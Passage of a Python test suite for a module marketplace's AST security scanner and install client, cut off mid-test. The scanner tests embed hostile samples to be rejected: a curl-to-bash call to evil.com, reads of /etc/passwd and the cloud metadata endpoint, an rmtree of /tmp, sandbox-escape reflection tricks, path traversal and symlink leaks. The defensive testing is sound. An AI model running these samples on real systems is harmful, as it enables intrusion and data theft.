"""
Unit and Integration Tests for Module Marketplace & Security Architecture.

Verifies:
- SemVer parsing and compatibility checks
- AST Security Scanner (detects banned imports, dangerous syscalls, eval)
- MarketplaceClient (search, info, install single-file, install directory pkg, bundle, domain, tag)
- Safe update & rollback mechanisms
- Module removal & lockfile consistency
- End-to-end CLI commands via main.py module
"""

from __future__ import annotations

import io
import json
import hashlib
from pathlib import Path
import shutil
import sys
import tempfile
import unittest
from unittest.mock import patch

from marketplace.client import MarketplaceClient, locate_registry_dir
from marketplace.models import (
    BundleManifest,
    InstalledModuleRecord,
    ModuleManifest,
    is_compatible_version,
    parse_semver,
)
from marketplace.security import SecurityScanner


class TestMarketplaceModelsAndSemVer(unittest.TestCase):
    def test_semver_parsing(self):
        self.assertEqual(parse_semver("1.0.0"), (1, 0, 0))
        self.assertEqual(parse_semver("v2.4.1"), (2, 4, 1))
        self.assertEqual(parse_semver("0.9"), (0, 9, 0))
        self.assertEqual(parse_semver("3"), (3, 0, 0))
        self.assertEqual(parse_semver("1.2.3-beta"), (1, 2, 3))

    def test_version_compatibility(self):
        self.assertTrue(is_compatible_version("1.0.0", "1.0.0"))
        self.assertTrue(is_compatible_version("1.0.0", "1.2.0"))
        self.assertTrue(is_compatible_version("1.0.0", "2.0.0"))
        self.assertFalse(is_compatible_version("1.2.0", "1.0.0"))
        self.assertFalse(is_compatible_version("2.0.0", "1.9.9"))


class TestASTSecurityScanner(unittest.TestCase):
    def test_safe_code_passes(self):
        code = """
import json
import math
from typing import Dict, Any

class SafeModule:
    name = "safe"
    def run(self, data: Dict[str, Any]) -> int:
        return math.floor(data.get("val", 0) * 1.5)
"""
        rep = SecurityScanner.scan_code(code, filename="safe.py")
        self.assertTrue(rep.is_safe)
        self.assertEqual(len(rep.violations), 0)

    def test_banned_subprocess_import_rejected(self):
        code = """
import subprocess
def execute():
    subprocess.run(["ls", "-la"])
"""
        rep = SecurityScanner.scan_code(code, filename="malicious.py")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("subprocess" in v for v in rep.violations))

    def test_banned_ctypes_import_rejected(self):
        code = """
from ctypes import c_int
def crash():
    pass
"""
        rep = SecurityScanner.scan_code(code, filename="malicious_ctypes.py")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("ctypes" in v for v in rep.violations))

    def test_banned_os_system_call_rejected(self):
        code = """
import os
def bad():
    os.system("curl https://evil.com/leak | bash")
"""
        rep = SecurityScanner.scan_code(code, filename="malicious_os.py")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("system" in v for v in rep.violations))

    def test_banned_eval_call_rejected(self):
        code = """
def bad(payload: str):
    return eval(payload)
"""
        rep = SecurityScanner.scan_code(code, filename="eval_vuln.py")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("eval" in v for v in rep.violations))

    def test_banned_exec_and_compile_rejected(self):
        code1 = "exec('import os; os.system(\"ls\")')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("exec" in v for v in rep1.violations))

        code2 = "compile('x = 1', '', 'exec')"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("compile" in v for v in rep2.violations))

    def test_banned_dynamic_import_call_rejected(self):
        code = "__import__('subprocess').call(['ls'])"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("__import__" in v for v in rep.violations))

    def test_banned_importlib_and_multiprocessing_rejected(self):
        code1 = "import importlib\nmod = importlib.import_module('os')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("importlib" in v for v in rep1.violations))

        code2 = "import multiprocessing\np = multiprocessing.Process()"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("multiprocessing" in v for v in rep2.violations))

    def test_banned_builtins_access_rejected(self):
        code = "b = __builtins__['eval']('1 + 1')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("__builtins__" in v for v in rep.violations))

    def test_external_pip_dependency_rejected(self):
        code = "import requests\nresp = requests.get('https://example.com')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("requests" in v for v in rep.violations))

    def test_offline_subsystem_network_rejected(self):
        code = "import urllib.request\ndata = urllib.request.urlopen('http://example.com')"
        # scam_analyser is an offline subsystem
        rep = SecurityScanner.scan_code(code, subsystem="scam_analyser")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("offline" in v for v in rep.violations))

        # info_providers is an online subsystem, so urllib.request is permitted
        rep_online = SecurityScanner.scan_code(code, subsystem="info_providers")
        self.assertTrue(rep_online.is_safe)

    def test_filesystem_destructive_call_rejected(self):
        code = "import shutil\nshutil.rmtree('/tmp')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("rmtree" in v for v in rep.violations))

    def test_subclasses_reflection_escape_rejected(self):
        code = "for c in ().__class__.__base__.__subclasses__(): pass"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("__subclasses__" in v for v in rep.violations))

    def test_getattr_concat_dynamic_resolution_rejected(self):
        code = "import os\ngetattr(os, 'sys' + 'tem')('ls')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("system" in v for v in rep.violations))

    def test_sys_modules_tampering_rejected(self):
        code = "import sys\nsys.modules['os'].system('ls')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("sys.modules" in v for v in rep.violations))

    def test_globals_and_locals_rejected(self):
        code1 = "g = globals()\ng['__builtins__']['eval']('1')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("globals" in v for v in rep1.violations))

        code2 = "l = locals()"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("locals" in v for v in rep2.violations))

    def test_breakpoint_and_input_rejected(self):
        rep1 = SecurityScanner.scan_code("breakpoint()")
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("breakpoint" in v for v in rep1.violations))

        rep2 = SecurityScanner.scan_code("x = input('wait: ')")
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("input" in v for v in rep2.violations))

    def test_builtins_module_import_rejected(self):
        code = "import builtins\nbuiltins.print('hello')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("builtins" in v for v in rep.violations))

    def test_dict_reflection_dunder_rejected(self):
        code = "import os\nos.__dict__['system']('ls')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("__dict__" in v for v in rep.violations))

    def test_file_write_open_modes_rejected(self):
        code1 = "open('output.txt', 'w').write('bad')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("write mode" in v for v in rep1.violations))

        code2 = "open('output.txt', mode='a').write('bad')"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("write mode" in v for v in rep2.violations))

        # Read mode should be permitted
        code3 = "open('data.json', 'r').read()"
        rep3 = SecurityScanner.scan_code(code3)
        self.assertTrue(rep3.is_safe)

    def test_path_write_text_and_bytes_rejected(self):
        code1 = "from pathlib import Path\nPath('evil.txt').write_text('bad')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("write_text" in v for v in rep1.violations))

        code2 = "from pathlib import Path\nPath('evil.bin').write_bytes(b'bad')"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("write_bytes" in v for v in rep2.violations))

    def test_dangerous_url_schemes_rejected(self):
        code = "url = 'file:///etc/passwd'\nprint(url)"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("file://" in v for v in rep.violations))

    def test_cloud_metadata_ip_rejected(self):
        code = "meta = 'http://169.254.169.254/latest/meta-data'\nprint(meta)"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("metadata" in v for v in rep.violations))

    def test_loopback_in_info_providers_rejected(self):
        code = "url = 'http://127.0.0.1:8080/api'\nprint(url)"
        rep = SecurityScanner.scan_code(code, subsystem="info_providers")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("loopback" in v for v in rep.violations))

    def test_offline_subsystem_os_environ_rejected(self):
        code = "import os\nk = os.environ['API_KEY']"
        rep = SecurityScanner.scan_code(code, subsystem="scam_analyser")
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("os.environ" in v for v in rep.violations))

    def test_os_environ_mutation_rejected(self):
        code = "import os\nos.environ['PATH'] = '/evil'"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("os.environ" in v for v in rep.violations))

    def test_setattr_tampering_rejected(self):
        code = "import sys\nsetattr(sys, 'modules', {})"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("tampering" in v for v in rep.violations))

    def test_pickle_and_marshal_rejected(self):
        code1 = "import pickle\npickle.loads(b'payload')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("pickle" in v for v in rep1.violations))

        code2 = "import marshal\nmarshal.loads(b'code')"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("marshal" in v for v in rep2.violations))

    def test_frame_and_inspect_rejected(self):
        code1 = "import inspect\nf = inspect.currentframe()"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("inspect" in v for v in rep1.violations))

        code2 = "import sys\nf = sys._getframe(0)"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("_getframe" in v for v in rep2.violations))

        code3 = "def check(f):\n  return f.f_globals"
        rep3 = SecurityScanner.scan_code(code3)
        self.assertFalse(rep3.is_safe)
        self.assertTrue(any("f_globals" in v for v in rep3.violations))

    def test_dynamic_obfuscated_getattr_on_os_rejected(self):
        code = "import os\ncmd = ''.join(['s', 'y', 's', 't', 'e', 'm'])\ngetattr(os, cmd)('ls')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("obfuscated attribute" in v for v in rep.violations))

    def test_pathlib_and_dynamic_open_modes_rejected(self):
        # 1. Path.open with write mode
        code1 = "from pathlib import Path\np = Path('out.txt')\np.open('w')"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("write mode" in v for v in rep1.violations))

        # 2. Dynamic variable mode
        code2 = "m = 'w'\nopen('out.txt', m)"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("non-constant mode" in v for v in rep2.violations))

        # 3. Path.touch prohibited
        code3 = "from pathlib import Path\nPath('foo').touch()"
        rep3 = SecurityScanner.scan_code(code3)
        self.assertFalse(rep3.is_safe)
        self.assertTrue(any("touch" in v for v in rep3.violations))

    def test_socket_and_shutil_rejected(self):
        code1 = "import socket\ns = socket.socket()"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("socket" in v for v in rep1.violations))

        code2 = "import shutil\nshutil.copy('a', 'b')"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("shutil" in v for v in rep2.violations))

    def test_sys_reassignment_rejected(self):
        code1 = "import sys\nsys.stdout = None"
        rep1 = SecurityScanner.scan_code(code1)
        self.assertFalse(rep1.is_safe)
        self.assertTrue(any("sys.stdout" in v for v in rep1.violations))

        code2 = "import os\nos.environ = {}"
        rep2 = SecurityScanner.scan_code(code2)
        self.assertFalse(rep2.is_safe)
        self.assertTrue(any("os.environ" in v for v in rep2.violations))

    def test_attribute_eval_and_exec_rejected(self):
        code = "class Engine:\n  pass\ne = Engine()\ne.eval('1+1')"
        rep = SecurityScanner.scan_code(code)
        self.assertFalse(rep.is_safe)
        self.assertTrue(any("eval" in v for v in rep.violations))

    def test_scan_directory_with_mixed_files(self):
        with tempfile.TemporaryDirectory() as tmp_dir:
            p = Path(tmp_dir)
            (p / "safe.py").write_text("x = 10\n", encoding="utf-8")
            (p / "bad.py").write_text("import pty\n", encoding="utf-8")

            rep = SecurityScanner.scan_directory(p)
            self.assertFalse(rep.is_safe)
            self.assertTrue(any("pty" in v for v in rep.violations))


class TestMarketplaceClient(unittest.TestCase):
    def setUp(self):
        self.tmp_dir = tempfile.mkdtemp(prefix="hw_mkt_test_")
        self.root_path = Path(self.tmp_dir)

        # Create simulated project structure in temp root
        for sub in [
            "info_providers/modules",
            "scam_analyser/modules",
            "build_composer/modules",
            "component_analyser/modules",
            "ai_providers/modules",
        ]:
            (self.root_path / sub).mkdir(parents=True, exist_ok=True)

        # Client points to local registry checkout for offline determinism
        reg_file = locate_registry_dir() / "registry.json"
        self.client = MarketplaceClient(
            registry_url_or_path=str(reg_file),
            root_dir=self.root_path,
        )

    def tearDown(self):
        shutil.rmtree(self.tmp_dir, ignore_errors=True)

    def test_registry_search_and_filter(self):
        # Search all
        res = self.client.search()
        self.assertGreaterEqual(len(res["modules"]), 4)
        self.assertGreaterEqual(len(res["bundles"]), 2)

        # Filter by domain
        pc_res = self.client.search(domain="hardware_pc")
        self.assertTrue(all(m["domain"] == "hardware_pc" for m in pc_res["modules"]))

        # Filter by subsystem
        scam_res = self.client.search(subsystem="scam_analyser")
        self.assertTrue(all(m["subsystem"] == "scam_analyser" for m in scam_res["modules"]))

        # Filter by query
        ssd_res = self.client.search(query="ssd")
        self.assertTrue(any("ssd" in m["name"] for m in ssd_res["modules"]))

    def test_info_retrieval(self):
        mod_info = self.client.info("sample_provider")
        self.assertIsNotNone(mod_info)
        self.assertEqual(mod_info["type"], "module")
        self.assertEqual(mod_info["name"], "sample_provider")

        bundle_info = self.client.info("bundle:pc-starter")
        self.assertIsNotNone(bundle_info)
        self.assertEqual(bundle_info["type"], "bundle")
        self.assertIn("sample_provider", bundle_info["modules"])

    def test_install_single_file_module(self):
        ok, msg = self.client.install("sample_provider")
        self.assertTrue(ok, msg)

        dest = self.root_path / "info_providers/modules/sample_provider.py"
        self.assertTrue(dest.is_file())

        installed = self.client.list_installed()
        self.assertEqual(len(installed), 1)
        self.assertEqual(installed[0]["name"], "sample_provider")

        # Second install without force should be rejected
        ok2, msg2 = self.client.install("sample_provider", force=False)
        self.assertFalse(ok2)
        self.assertIn("already installed", msg2)

    def test_install_directory_package(self):
        ok, msg = self.client.install("ssd_wear_detector")
        self.assertTrue(ok, msg)

        dest_dir = self.root_path / "scam_analyser/modules/ssd_wear_detector"
        self.assertTrue(dest_dir.is_dir())
        self.assertTrue((dest_dir / "__init__.py").is_file())
        self.assertTrue((dest_dir / "flash_chips.json").is_file())

    def test_install_bundle(self):
        ok, msg = self.client.install("bundle:pc-starter")
        self.assertTrue(ok, msg)

        # Modules in pc-starter should be present
        self.assertTrue((self.root_path / "info_providers/modules/sample_provider.py").is_file())
        self.assertTrue((self.root_path / "scam_analyser/modules/reball_detector.py").is_file())
        self.assertTrue((self.root_path / "build_composer/modules/value_composer.py").is_file())

        installed = self.client.list_installed()
        names = {m["name"] for m in installed}
        self.assertTrue({"sample_provider", "reball_detector", "value_composer"}.issubset(names))

    def test_install_bundle_zero_prefix_smart_resolution(self):
        # Install without 'bundle:' prefix — should automatically resolve to bundle 'pc-starter-kit'
        ok, msg = self.client.install("pc-starter-kit")
        self.assertTrue(ok, msg)
        self.assertIn("Installed bundle 'pc-starter-kit'", msg)

        installed = self.client.list_installed()
        names = {m["name"] for m in installed}
        self.assertTrue({"pc", "sample_provider", "reball_detector", "value_composer"}.issubset(names))

    def test_remote_http_registry_fetch_and_directory_download(self):
        pkg_files = {
            "__init__.py": b"class RemoteMod:\n    name = 'remote_mod'\n    def analyze(self, item, detail=None, spec=None):\n        return {'risk_score': 0}\n",
            "rules.json": b'{"ok": true}\n',
        }
        h = hashlib.sha256()
        for rel_name in sorted(pkg_files):
            h.update(rel_name.encode("utf-8"))
            h.update(pkg_files[rel_name])
        dir_sha = h.hexdigest()

        remote_index = {
            "version": "1.0.0",
            "modules": [
                {
                    "name": "remote_mod",
                    "subsystem": "scam_analyser",
                    "domain": "general",
                    "version": "1.0.0",
                    "author": "Tester",
                    "source_type": "directory",
                    "download_url": "modules/scam_analyser/remote_mod",
                    "sha256": dir_sha,
                    "files": ["__init__.py", "rules.json"],
                }
            ],
            "bundles": [],
        }

        class _FakeResp:
            def __init__(self, body: bytes):
                self._body = body

            def read(self) -> bytes:
                return self._body

            def __enter__(self):
                return self

            def __exit__(self, exc_type, exc, tb):
                return False

        def fake_urlopen(req, timeout=10):
            url = req.full_url if hasattr(req, "full_url") else str(req)
            if url == "https://example.test/reg/registry.json":
                return _FakeResp(json.dumps(remote_index).encode("utf-8"))
            if url == "https://example.test/reg/modules/scam_analyser/remote_mod/__init__.py":
                return _FakeResp(pkg_files["__init__.py"])
            if url == "https://example.test/reg/modules/scam_analyser/remote_mod/rules.json":
                return _FakeResp(pkg_files["rules.json"])
            raise AssertionError(f"Unexpected URL fetched: {url}")

        remote_client = MarketplaceClient(
            registry_url_or_path="https://example.test/reg/registry.json",
            root_dir=self.root_path,
        )
        with patch("urllib.request.urlopen", side_effect=fake_urlopen):
            ok, msg = remote_client.install("remote_mod")
        self.assertTrue(ok, msg)
        dest = self.root_path / "scam_analyser/modules/remote_mod"
        self.assertTrue((dest / "__init__.py").is_file())
        self.assertTrue((dest / "rules.json").is_file())

    def test_shared_canonical_data_domain_resolution(self):
        from market_client import normalize_data_domain
        import extensions
        from extension_registry import register_extension, unregister_extension
        from marketplace.client import locate_registry_dir
        reg_ext = str(locate_registry_dir() / "modules" / "extensions")
        if reg_ext not in extensions.__path__:
            extensions.__path__.append(reg_ext)
        from extensions.pc import PCDomainExtension
        from extensions.fishing import FishingDomainExtension
        register_extension(PCDomainExtension())
        register_extension(FishingDomainExtension())
        self.addCleanup(lambda: (unregister_extension("pc"), unregister_extension("fishing")))
        # Multiple plugins, builders, or composers asking for CPU/GPU data resolve to 'pc'
        self.assertEqual(normalize_data_domain("pc-builder", "cpu"), "pc")
        self.assertEqual(normalize_data_domain("pc-prebuilt", "cpu"), "pc")
        self.assertEqual(normalize_data_domain("hardware_pc", "gpu"), "pc")
        self.assertEqual(normalize_data_domain(None, "cpu"), "pc")
        self.assertEqual(normalize_data_domain(None, "gpu"), "pc")
        # Fishing categories resolve to 'fishing'
        self.assertEqual(normalize_data_domain("fishing-tackle", "rod"), "fishing")
        self.assertEqual(normalize_data_domain(None, "reel"), "fishing")
        # Custom domain passes through cleanly
        self.assertEqual(normalize_data_domain("smartphones", "battery"), "smartphones")

    def test_install_domain_and_tag(self):
        ok, msg = self.client.install("tag:ssd")
        self.assertTrue(ok, msg)
        self.assertTrue((self.root_path / "scam_analyser/modules/ssd_wear_detector").is_dir())

    def test_security_scanner_rejects_malicious_module(self):
        # Create a custom registry with a malicious module
        fake_reg = self.root_path / "fake_registry"
        fake_reg.mkdir(parents=True, exist_ok=True)
        (fake_reg / "malicious.py").write_text("import subprocess\nsubprocess.run('ls')\n", encoding="utf-8")

        bad_index = {
            "modules": [
                {
                    "name": "malicious_hack",
                    "subsystem": "info_providers",
                    "domain": "general",
                    "version": "1.0.0",
                    "author": "Attacker",
                    "description": "Evil module",
                    "min_app_version": "1.0.0",
                    "trust_level": "community",
                    "source_type": "single_file",
                    "download_url": "malicious.py",
                    "sha256": None,
                    "tags": ["evil"],
                }
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(bad_index), encoding="utf-8")

        custom_client = MarketplaceClient(
            registry_url_or_path=str(fake_reg),
            root_dir=self.root_path,
        )

        ok, msg = custom_client.install("malicious_hack")
        self.assertFalse(ok)
        self.assertIn("Security Scanner Rejected", msg)
        self.assertFalse((self.root_path / "info_providers/modules/malicious_hack.py").exists())

    def test_remove_module_and_cleanup(self):
        # Install then remove
        self.client.install("sample_provider")
        self.assertTrue((self.root_path / "info_providers/modules/sample_provider.py").is_file())

        ok, msg = self.client.remove("sample_provider")
        self.assertTrue(ok, msg)
        self.assertFalse((self.root_path / "info_providers/modules/sample_provider.py").exists())
        self.assertEqual(len(self.client.list_installed()), 0)

    def test_config_inspection(self):
        cfg = self.client.config("sample_provider")
        self.assertEqual(cfg["name"], "sample_provider")
        self.assertTrue(cfg["all_configured"])

    def test_path_traversal_module_name_rejected(self):
        fake_reg = self.root_path / "fake_reg_traversal"
        fake_reg.mkdir(parents=True, exist_ok=True)
        (fake_reg / "hack.py").write_text("x = 1\n", encoding="utf-8")
        bad_index = {
            "modules": [
                {
                    "name": "../../evil",
                    "subsystem": "info_providers",
                    "source_type": "single_file",
                    "download_url": "hack.py",
                }
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(bad_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)
        ok, msg = client.install("../../evil")
        self.assertFalse(ok)
        self.assertIn("Invalid module name", msg)

    def test_remove_evicts_from_sys_modules(self):
        self.client.install("sample_provider")
        sys.modules["info_providers.modules.sample_provider"] = "mock_loaded"
        ok, msg = self.client.remove("sample_provider")
        self.assertTrue(ok)
        self.assertNotIn("info_providers.modules.sample_provider", sys.modules)

    def test_symlink_in_directory_package_rejected(self):
        fake_reg = self.root_path / "fake_reg_symlink"
        pkg_dir = fake_reg / "evil_pkg"
        pkg_dir.mkdir(parents=True, exist_ok=True)
        (pkg_dir / "__init__.py").write_text("x = 1\n", encoding="utf-8")
        
        # Create a symlink pointing to /etc/hosts or temp file
        target_file = self.root_path / "secret.txt"
        target_file.write_text("secret_data\n", encoding="utf-8")
        (pkg_dir / "link_out").symlink_to(target_file)

        bad_index = {
            "modules": [
                {
                    "name": "evil_pkg",
                    "subsystem": "info_providers",
                    "source_type": "directory",
                    "download_url": "evil_pkg",
                }
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(bad_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)
        ok, msg = client.install("evil_pkg")
        self.assertFalse(ok)
        self.assertIn("symlinks prohibited", msg)
        self.assertFalse((self.root_path / "info_providers/modules/evil_pkg").exists())

    def test_format_transition_single_to_dir_and_vice_versa(self):
        fake_reg = self.root_path / "fake_reg_transitions"
        fake_reg.mkdir(parents=True, exist_ok=True)

        # 1. First version: single file
        (fake_reg / "morph_mod.py").write_text("v = 1\n", encoding="utf-8")
        # 2. Second version: directory package
        dir_mod = fake_reg / "morph_dir"
        dir_mod.mkdir(parents=True, exist_ok=True)
        (dir_mod / "__init__.py").write_text("v = 2\n", encoding="utf-8")

        index_v1 = {
            "modules": [
                {
                    "name": "morph_mod",
                    "subsystem": "info_providers",
                    "source_type": "single_file",
                    "download_url": "morph_mod.py",
                    "version": "1.0.0",
                }
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(index_v1), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)

        # Install v1 as single file
        ok1, msg1 = client.install("morph_mod")
        self.assertTrue(ok1, msg1)
        self.assertTrue((self.root_path / "info_providers/modules/morph_mod.py").is_file())

        # Update registry to v2 directory package
        index_v2 = {
            "modules": [
                {
                    "name": "morph_mod",
                    "subsystem": "info_providers",
                    "source_type": "directory",
                    "download_url": "morph_dir",
                    "version": "2.0.0",
                }
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(index_v2), encoding="utf-8")

        # Install v2 with force (transition from single file to directory package)
        ok2, msg2 = client.install("morph_mod", force=True)
        self.assertTrue(ok2, msg2)
        # Old single file should be deleted, directory package should be present
        self.assertFalse((self.root_path / "info_providers/modules/morph_mod.py").exists())
        self.assertTrue((self.root_path / "info_providers/modules/morph_mod/__init__.py").is_file())

    def test_cyclic_bundle_dependency_rejected(self):
        fake_reg = self.root_path / "fake_reg_cycles"
        fake_reg.mkdir(parents=True, exist_ok=True)
        (fake_reg / "dummy.py").write_text("x = 1\n", encoding="utf-8")

        bad_index = {
            "modules": [
                {
                    "name": "dummy_mod",
                    "subsystem": "info_providers",
                    "source_type": "single_file",
                    "download_url": "dummy.py",
                }
            ],
            "bundles": [
                {"name": "bundle_alpha", "modules": ["dummy_mod", "bundle:bundle_beta"]},
                {"name": "bundle_beta", "modules": ["bundle:bundle_alpha"]},
            ],
        }
        (fake_reg / "registry.json").write_text(json.dumps(bad_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)
        ok, msg = client.install("bundle:bundle_alpha")
        self.assertTrue(ok)  # Returns True for bundle execution with inner failures reported
        self.assertIn("Cyclic bundle dependency detected", msg)

    def test_corrupted_installed_records_recovery(self):
        # Write corrupted JSON to installed_modules.json
        (self.root_path / "data/installed_modules.json").write_text("{broken json", encoding="utf-8")
        records = self.client._read_installed_records()
        self.assertEqual(records, {})
        # .corrupt backup should have been saved
        self.assertTrue((self.root_path / "data/installed_modules.json.corrupt").exists())

    def test_directory_package_sha256_verification_and_mismatch_rejection(self):
        fake_reg = self.root_path / "fake_reg_pkg_sha"
        pkg_dir = fake_reg / "sample_pkg"
        pkg_dir.mkdir(parents=True, exist_ok=True)
        (pkg_dir / "__init__.py").write_text("x = 100\n", encoding="utf-8")
        (pkg_dir / "data.json").write_text('{"key": "value"}\n', encoding="utf-8")

        from marketplace.client import compute_directory_hash
        correct_sha = compute_directory_hash(pkg_dir)

        # 1. Test installation with matching SHA256 succeeds
        reg_index = {
            "modules": [
                {
                    "name": "sample_pkg",
                    "subsystem": "component_analyser",
                    "source_type": "directory",
                    "download_url": "sample_pkg",
                    "sha256": correct_sha,
                }
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(reg_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)
        ok, msg = client.install("sample_pkg")
        self.assertTrue(ok, msg)
        installed = client.list_installed()
        self.assertEqual(installed[0]["sha256"], correct_sha)

        # 2. Test installation with mismatched SHA256 is rejected and cleaned up
        client.remove("sample_pkg", force=True)
        reg_index["modules"][0]["sha256"] = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        (fake_reg / "registry.json").write_text(json.dumps(reg_index), encoding="utf-8")
        ok_bad, msg_bad = client.install("sample_pkg")
        self.assertFalse(ok_bad)
        self.assertIn("Directory package SHA256 mismatch", msg_bad)
        self.assertFalse((self.root_path / "component_analyser/modules/sample_pkg").exists())

    def test_inter_module_dependencies_auto_install(self):
        fake_reg = self.root_path / "fake_reg_deps"
        fake_reg.mkdir(parents=True, exist_ok=True)
        (fake_reg / "base_helper.py").write_text("v = 1\n", encoding="utf-8")
        (fake_reg / "main_feature.py").write_text("import json\nv = 2\n", encoding="utf-8")

        reg_index = {
            "modules": [
                {
                    "name": "base_helper",
                    "subsystem": "scam_analyser",
                    "source_type": "single_file",
                    "download_url": "base_helper.py",
                    "version": "1.0.0",
                },
                {
                    "name": "main_feature",
                    "subsystem": "build_composer",
                    "source_type": "single_file",
                    "download_url": "main_feature.py",
                    "version": "1.0.0",
                    "dependencies": ["base_helper"],
                },
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(reg_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)

        # Installing main_feature should automatically resolve and install base_helper
        ok, msg = client.install("main_feature")
        self.assertTrue(ok, msg)
        self.assertIn("Installed dependency 'base_helper'", msg)
        self.assertTrue((self.root_path / "scam_analyser/modules/base_helper.py").is_file())
        self.assertTrue((self.root_path / "build_composer/modules/main_feature.py").is_file())

        installed_map = {m["name"]: m for m in client.list_installed()}
        self.assertIn("base_helper", installed_map)
        self.assertIn("main_feature", installed_map)
        self.assertEqual(installed_map["main_feature"]["dependencies"], ["base_helper"])

    def test_cyclic_module_dependencies_rejected(self):
        fake_reg = self.root_path / "fake_reg_cyclic_mod"
        fake_reg.mkdir(parents=True, exist_ok=True)
        (fake_reg / "mod_a.py").write_text("x = 1\n", encoding="utf-8")
        (fake_reg / "mod_b.py").write_text("x = 2\n", encoding="utf-8")

        reg_index = {
            "modules": [
                {
                    "name": "mod_a",
                    "subsystem": "scam_analyser",
                    "source_type": "single_file",
                    "download_url": "mod_a.py",
                    "dependencies": ["mod_b"],
                },
                {
                    "name": "mod_b",
                    "subsystem": "scam_analyser",
                    "source_type": "single_file",
                    "download_url": "mod_b.py",
                    "dependencies": ["mod_a"],
                },
            ],
            "bundles": [],
        }
        (fake_reg / "registry.json").write_text(json.dumps(reg_index), encoding="utf-8")
        client = MarketplaceClient(registry_url_or_path=str(fake_reg), root_dir=self.root_path)

        ok, msg = client.install("mod_a")
        self.assertFalse(ok)
        self.assertIn("Cyclic module dependency detected", msg)

    def test_remove_blocked_by_dependency_without_force(self):
        fake_reg = self.root_path / "fake_reg_remove_dep"
        fake_reg.mkdir(parents=True, exist_ok=True)
        (fake_reg / "core_mod.py").write_text("x = 1\n", encoding="utf-8")
        (fake_reg / "app_mod.py").write_text("x = 2\n", encoding="utf-8")

        reg_index = {
            "modules": [
                {
                    "name": "core_mod",
